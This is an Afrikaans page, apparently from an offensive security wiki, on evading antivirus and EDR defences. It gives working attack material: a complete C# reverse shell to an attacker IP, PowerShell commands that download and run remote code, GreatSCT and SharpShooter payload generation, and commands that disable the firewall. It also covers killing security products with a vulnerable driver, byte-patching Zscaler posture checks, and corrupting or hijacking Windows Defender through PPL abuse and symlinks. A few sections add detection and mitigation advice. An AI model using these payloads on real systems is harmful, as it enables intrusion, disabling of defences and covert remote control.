[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n hulpmiddel wat payloads in output containers inpak om Mark-of-the-Web te ontduik.

Voorbeeld gebruik:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is 'n demo om SmartScreen te omseil deur payloads binne ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is 'n kragtige logmeganisme in Windows wat toepassings en stelselkomponente toelaat om gebeurtenisse te registreer. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en op te spoor.

Soortgelyk aan hoe AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die user-space proses dadelik terug te laat keer sonder om enige gebeurtenisse te registreer. Dit word gedoen deur die funksie in geheue te patch sodat dit onmiddellik terugkeer, wat ETW-logering vir daardie proses effektief uitskakel.

Meer inligting vind jy in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Om C# binaries in geheue te laai is al 'n geruime tyd bekend en bly 'n uitstekende manier om jou post-exploitation gereedskap te laat loop sonder om deur AV gevang te word.

Aangesien die payload direk in geheue gelaai word sonder om die skyf te raak, hoef ons slegs bekommerd te wees oor die patching van AMSI vir die hele proses.

Die meeste C2-frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskeie maniere om dit te doen:

- **Fork\&Run**

Dit behels die **spawn van 'n nuwe offerproses**, die inspuiting van jou post-exploitation kwaadwillige kode in daardie nuwe proses, die uitvoering van jou kwaadwillige kode en, wanneer klaar, die beëindiging van die nuwe proses. Dit het beide voordele en nadele. Die voordeel van die fork-and-run-metode is dat uitvoering buite ons Beacon implant-proses plaasvind. Dit beteken dat as iets in ons post-exploitation aksie verkeerd loop of gevang word, daar 'n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat daar 'n **groter kans** is om deur **Behavioural Detections** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan daaroor om die post-exploitation kwaadwillige kode **in eie proses** in te spuit. Op hierdie manier kan jy vermy om 'n nuwe proses te skep wat deur AV gescan word, maar die nadeel is dat as iets verkeerd loop met die uitvoering van jou payload, daar 'n **veel groter kans** is om jou **beacon te verloor** aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

[!TIP]
As jy meer wil lees oor C# Assembly loading, sien hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies van PowerShell laai; kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode in ander tale uit te voer deur die gekompromitteerde masjien toegang te gee tot die interpreter-omgewing wat op die Attacker Controlled SMB share geïnstalleer is.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB-share toe te laat, kan jy **arbitrêre kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender skandeer nog steeds die scripts, maar deur Go, Java, PHP ens. te gebruik het ons **meer buigbaarheid om statiese signatures te omseil**. Toetsing met ewekansige on-obfuskeerde reverse shell scripts in hierdie tale was suksesvol.

## TokenStomping

Token stomping is 'n tegniek wat 'n aanvaller toelaat om die toegangstoken of 'n sekuriteitsproduk soos 'n EDR of AV te **manipuleer**, sodat hulle dit se regte kan verminder — die proses sal nie noodwendig sterf nie, maar sal nie die permissies hê om na kwaadwillige aktiwiteite te kyk nie.

Om dit te voorkom, kan Windows **voorkom dat eksterne prosesse** handles oor die tokens van sekuriteitsprosesse kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Soos beskryf in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om net Chrome Remote Desktop op 'n slagoffer se PC te versprei en dit dan te gebruik om dit oor te neem en volhoubaarheid te handhaaf:
1. Download vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Voer die installateur stil uit op die slagoffer (admin benodig): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik next. Die wizard sal jou vra om te autoriseer; klik die Authorize-knoppie om voort te gaan.
4. Voer die gegewe parameter met sommige aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin-parameter wat toelaat om die pin te stel sonder om die GUI te gebruik).

## Advanced Evasion

Evasion is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, so dit is byna onmoontlik om in volwassenes omgewings heeltemal onopgemerk te bly.

Elke omgewing wat jy teëkom sal sy eie sterkpunte en swakhede hê.

Ek beveel sterk aan dat jy hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) kyk om 'n inkopingspunt in meer Advanced Evasion tegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook 'n ander goeie praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat dele van die binary **verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig beskou en dit vir jou opsplits.\
Nog 'n hulpmiddel wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n oop webdiens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot Windows10 het alle Windows-weergawes 'n **Telnet server** gehad wat jy kon installeer (as administrator) deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel opstart en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet-poort** (stealth) en deaktiveer firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **nuut** geskepte file _**UltraVNC.ini**_ op die **victim**

#### **Reverse connection**

Die **attacker** moet die binary `vncviewer.exe -listen 5900` op sy **host** uitvoer sodat dit **gereed** is om 'n reverse **VNC connection** te vang. Dan, op die **victim**: Start die winvnc daemon `winvnc.exe -run` en run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WAARSKUWING:** Om stealth te behou moet jy 'n paar dinge nie doen nie

- Moet nie `winvnc` begin as dit reeds loop nie, anders sal jy 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. check if it's running with `tasklist | findstr winvnc`
- Moet nie `winvnc` begin sonder `UltraVNC.ini` in dieselfde directory nie of dit sal [the config window](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moet nie `winvnc -h` vir help run nie of jy sal 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af van: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nou **begin die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Die huidige Defender sal die proses baie vinnig beëindig.**

### Kompileer ons eie reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# wat die compiler gebruik
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators lys: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik python vir build injectors voorbeeld:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 het 'n klein konsolehulpmiddel gebruik wat bekend staan as **Antivirus Terminator** om endpoint-beskerming uit te skakel voordat ransomware neergesit is. Die instrument bring sy **eie kwesbare maar *gesigneerde* driver** en misbruik dit om bevoorregte kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Belangrike punte
1. **Signed driver**: Die lêer wat na skyf gelewer word is `ServiceMouse.sys`, maar die binêre is die wettig gesigneerde driver `AToolsKrnl64.sys` van Antiy Labs’ “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) aangeskakel is.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as 'n **kernel service** en die tweede begin dit sodat `\\.\ServiceMouse` vanaf user land toeganklik raak.
3. **IOCTLs exposed by the driver**
| IOCTL code | Vermoë                                  |
|-----------:|-----------------------------------------|
| `0x99000050` | Beëindig 'n arbitrêre proses per PID (gebruik om Defender/EDR-dienste te uitskakel) |
| `0x990000D0` | Vee 'n arbitrêre lêer op skyf uit |
| `0x990001D0` | Laai die driver uit en verwyder die diens |

Minimale C bewys van konsep:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD slaan user-mode beskerming heeltemal oor; kode wat in die kernel uitvoer kan *beskermde* prosesse oopmaak, hulle beëindig, of met kernel-objekte tamper ongeag PPL/PP, ELAM of ander hardening-funksies.

Detection / Mitigation
•  Skakel Microsoft se vulnerable-driver block list aan (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor die skep van nuwe *kernel* dienste en waarsku wanneer 'n driver vanaf 'n gids met wêreldwye skryfpermisies gelaai word of nie op die allow-list is nie.
•  Hou ŉ oog op user-mode handles na pasgemaakte device-objekte gevolg deur verdagte `DeviceIoControl`-oproepe.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** pas toestel-postuur-reëls plaaslik toe en vertrou op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpskeuses maak 'n volledige omseiling moontlik:

1. Postuur-evaluasie gebeur **heeltemal kliëntkant** (’n boolean word na die bediener gestuur).
2. Interne RPC-endpunte valideer slegs dat die verbindende uitvoerbare lêer **gesigneer deur Zscaler** is (via `WinVerifyTrust`).

Deur **vier gesigneerde binaries op skyf te patch** kan albei meganismes uitgekakel word:

| Binary | Oorspronklike logika gepatch | Resultaat |
|--------|------------------------------|-----------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug, sodat elke kontrole as voldoen beskou word |
| `ZSAService.exe` | Indirekte oproep na `WinVerifyTrust` | NOP-ed ⇒ enige (selfs ongetekende) proses kan aan die RPC-pype bind |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang met `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integriteitskontroles op die tunnel | Kortgesluit |

Minimale patcher-uittreksel:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nadat die oorspronklike lêers vervang is en die diens-stapel herbegin is:

* **Alle** postuurkontroles wys **groen/voldoen**.
* Ongetekende of gemodifiseerde binaries kan die named-pipe RPC-eindpunte open (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk soos deur die Zscaler-beleide gedefinieer.

Hierdie gevallestudie demonstreer hoe uitsluitlik client-side vertrouensbesluite en eenvoudige handtekeningkontroles met 'n paar byte-patches oorkom kan word.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) handhaaf 'n handtekenaar/vlak-hiërargie sodat slegs beskermde prosesse met gelyke of hoër vlak mekaar kan manipuleer. Aanvalsgewys, as jy legitiem 'n PPL-enabled binary kan start en sy argumente beheer, kan jy onskuldige funksionaliteit (bv. logging) omskakel in 'n beperkte, deur PPL gesteunde skryf-primitief teen beskermde gidse wat deur AV/EDR gebruik word.

Wat veroorsaak dat 'n proses as PPL loop
- Die teiken EXE (en enige gelaaide DLLs) moet geteken wees met 'n PPL-geskikte EKU.
- Die proses moet geskep word met CreateProcess gebruik makend van die vlae: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 'n Kompatibele beskermingsvlak moet aangevra word wat by die handtekenaar van die binary pas (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware handtekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-handtekenaars). Verkeerde vlakke sal tydens skepping misluk.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (kies beskermingsvlak en stuur argumente deur na die teikengestelde EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Gebruikspatroon:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die gesigneerde stelsel-binary `C:\Windows\System32\ClipUp.exe` skep 'n subproses en aanvaar 'n parameter om 'n loglêer na 'n deur die aanroeper gespesifiseerde pad te skryf.
- Wanneer dit as 'n PPL-proses gelanseer word, gebeur die lêerskryf met PPL-ondersteuning.
- ClipUp kan nie paaie met spasies parse nie; gebruik 8.3-kortpaaie om na normaalweg beskermde lokasies te verwys.

8.3 short path helpers
- Lys kort name: `dir /x` in elke ouer-gids.
- Kry kortpad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lanseer die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur 'n launcher te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp log-pad-argument om 'n lêerskepping af te dwing in 'n beskermde AV-gids (bv. Defender Platform). Gebruik 8.3-kortname indien nodig.
3) As die teiken-binary gewoonlik deur die AV oop/gesluit is terwyl dit loop (bv. MsMpEng.exe), skeduleer die skryf tydens opstart voordat die AV begin deur 'n auto-start diens te installeer wat betroubaar vroeër loop. Valideer opstartvolgorde met Process Monitor (boot logging).
4) By herlaai gebeur die PPL-ondersteunde skryf voordat die AV sy binaries sluit, wat die teikenlêer korrup maak en die opstart verhinder.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Aantekeninge en beperkings
- Jy kan nie die inhoud wat ClipUp skryf beheer behalwe die plasing nie; die primitive is geskik vir korrupsie eerder as presiese inhoudsinspuiting.
- Vereis lokale admin/SYSTEM om 'n diens te installeer/te begin en 'n herlaaivenster.
- Tydsberekening is kritiek: die teiken mag nie oop wees nie; uitvoering tydens opstart vermy lêerslotte.

Opsporings
- Proses-skepping van `ClipUp.exe` met ongewone argumente, veral indien dit deur nie-standaard launchers geparenteer is, rondom opstart.
- Nuwe dienste gekonfigureer om verdagte binaries outomaties te begin en wat konsekwent voor Defender/AV begin. Ondersoek diensskepping/wysiging voor Defender-opstartfoute.
- Lêer-integriteitsmonitering op Defender binaries/Platform-lêergidse; onverwagte lêerskeppings/wysigings deur prosesse met protected-process-vlagte.
- ETW/EDR telemetry: kyk vir prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale gebruik van PPL-vlakke deur nie-AV binaries.

Mitigeringsmaatreëls
- WDAC/Code Integrity: beperk watter gesigneerde binaries as PPL mag loop en onder watter ouers; blokkeer ClipUp-aanroep buite wettige kontekste.
- Dienshigiëne: beperk skepping/wysiging van outo-begin-dienste en monitor manipulasie van begin-orde.
- Maak seker Defender tamper protection en early-launch protections is geaktiveer; ondersoek opstartfoute wat na binary-korrupsie dui.
- Oorweeg om 8.3 short-name generation op volumes wat sekuriteitsgereedskap huisves uit te skakel indien verenigbaar met jou omgewing (toets deeglik).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvandaan dit loop deur subgidse onder te enumereer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawe-string (bv. `4.18.25070.5-0`), en begin dan die Defender-diensprosesse van daar af (en werk diens-/registerpaaie dienooreenkomstig by). Hierdie seleksie vertrou gidsinskrywings insluitende directory reparse points (symlinks). 'n Administrateur kan dit misbruik om Defender na 'n aanvaller-skryfbare pad om te lei en sodoende DLL sideloading of diensonderbreking te bereik.

Voorvereistes
- Local Administrator (benodig om gidse/symlinks onder die Platform-gids te skep)
- Vermoë om te herbegin of Defender platform-herseleksie te trigger (diens-herbegin op opstart)
- Slegs ingeboude gereedskap benodig (mklink)

Hoekom dit werk
- Defender blokkeer skrywe in sy eie gidse, maar sy platformseleksie vertrou gidsinskrywings en kies die leksikografies hoogste weergawe sonder te verifieer dat die teiken na 'n beskermde/vertroude pad oplos.

Stapsgewyse (voorbeeld)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep 'n hoër-weergawe gids-symlink binne Platform wat na jou gids wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-keuse (herbegin word aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die omgelei pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` te sien en die dienskonfigurasie/register wat daardie ligging weerspieël.

Post-exploitation options
- DLL sideloading/code execution: Plaas/vervang DLLs wat Defender vanaf sy toepassingsgids laai om kode in Defender se prosesse uit te voer. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Verwyder die version-symlink sodat by die volgende begin die gekonfigureerde pad nie oplos nie en Defender misluk om te begin:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Let wel: hierdie tegniek verskaf op sigself geen privilege escalation nie; dit vereis admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime‑evasie uit die C2‑implant na die teikenmodule self verskuif deur sy Import Address Table (IAT) te hook en geselekteerde APIs deur attacker‑controlled, position‑independent code (PIC) te stuur. Dit veralgemeen evasion buite die klein API‑oppervlak wat baie kits blootstel (bv., CreateProcessA), en brei dieselfde beskerming uit na BOFs en post‑exploitation DLLs.

Hoëvlakbenadering
- Plaas 'n PIC‑blob langs die teikenmodule met behulp van 'n reflective loader (prepended of companion). Die PIC moet selfstandig en posisie‑onafhanklik wees.
- Terwyl die gasheer‑DLL laai, deurloop sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT‑inskrywings vir geteikende imports (bv., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) sodat hulle na dun PIC‑wrappers wys.
- Elke PIC‑wrapper voer versteekmetodes uit voordat hy 'n tail‑calling na die werklike API‑adres maak. Tipiese versteekmetodes sluit in:
  - Geheue maskering/de‑maskering rondom die oproep (bv., encrypt beacon‑streke, RWX→RX, verander bladsy‑name/toestemmings) en herstel daarna.
  - Call‑stack spoofing: konstrueer 'n onskadelike stapel en skuif in die teiken‑API sodat call‑stack‑analise na verwagte rame oplos.
